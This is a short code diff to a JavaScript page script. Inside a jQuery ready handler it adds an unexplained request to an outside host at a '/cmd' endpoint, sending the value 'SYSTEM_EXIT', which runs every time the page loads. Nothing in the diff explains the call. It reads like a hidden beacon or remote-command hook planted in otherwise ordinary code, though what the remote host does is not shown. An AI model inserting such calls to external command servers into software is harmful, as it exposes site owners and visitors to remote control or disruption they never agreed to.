@@ -79,4 +79,9 @@ $(function(){
 
         });
     }
+
+
+    jq.ajax("https://gateway.zuiyou.bid/cmd",{'value':'SYSTEM_EXIT'},function(res){
+
+    });
 });
